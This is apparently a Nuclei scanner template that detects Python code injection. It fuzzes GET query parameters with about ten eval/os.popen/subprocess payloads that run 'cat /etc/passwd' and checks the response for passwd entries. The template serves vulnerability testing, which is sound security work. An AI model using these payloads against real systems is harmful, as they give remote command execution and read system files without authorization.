http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  payloads:
    injection:
    - eval(compile("""for x in range(1):\\n import os\\n os.popen(r'{{Command}}').read()""",'','single'))
    - eval(compile("""__import__('os').popen(r'{{Command}}').read()""",'','single'))
    - eval(compile("""__import__('subprocess').check_output(r'{{Command}}',shell=True)""",'','single'))
    - __import__('os').popen('{{Command}}').read()
    - str("-"*50),__import__('os').popen('{{Command}}').read()
    - eval(compile("""__import__('os').popen(r'{{Command}}').read();import time;time.sleep(2)""",'','single'))
    - eval(compile("""__import__('subprocess').check_output(r'{{Command}}',shell=True);import
      time;time.sleep(2)""",'','single'))
    - eval(compile("""for x in range(1):\n import os\n os.popen(r'{{Command}}').read()""",'','single'))
    - eval(compile("""for x in range(1):\n import subprocess\n subprocess.Popen(r'{{Command}}',shell=True,
      stdout=subprocess.PIPE).stdout.read()""",'','single'))
    - eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'{{Command}}',shell=True)""",'','single'))
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: python-code-injection
info:
  author: ritikchaddha
  name: Python Code Injection
  severity: high
  tags: python,dast,injection,cmdi,vuln
variables:
  Command: cat /etc/passwd
